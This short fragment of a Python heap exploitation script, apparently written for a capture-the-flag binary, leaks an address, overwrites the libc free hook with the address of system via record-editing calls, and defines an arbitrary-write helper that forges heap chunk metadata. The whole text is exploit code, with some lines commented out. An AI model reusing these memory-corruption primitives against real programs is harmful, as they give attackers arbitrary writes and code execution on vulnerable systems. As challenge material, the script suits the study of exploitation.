...
#p.recvuntil(b'\x62')
#rip_leak = (int.from_bytes(b'\x62' + p.recvuntil(b'\x00')[:6], 'little'))
#print("rip leak:", hex(rip_leak)) # got it!     
...
add_record(0xe8, p64(freeHook_addr))
#add_record(0x100, b'A' * 8)
edit_record(3, 0x100, p64(sys_addr))



def arbitrary_write(src, dest):
    edit_record(2, 0x200, b'A' * 0x100 + p64(0) + p64(0x21) + p64(0x1) + p64(0x200) + p64(src))
    edit_record(3, 0x100, p64(dest))


#arbitrary_write(freeHook_addr, sys_addr)
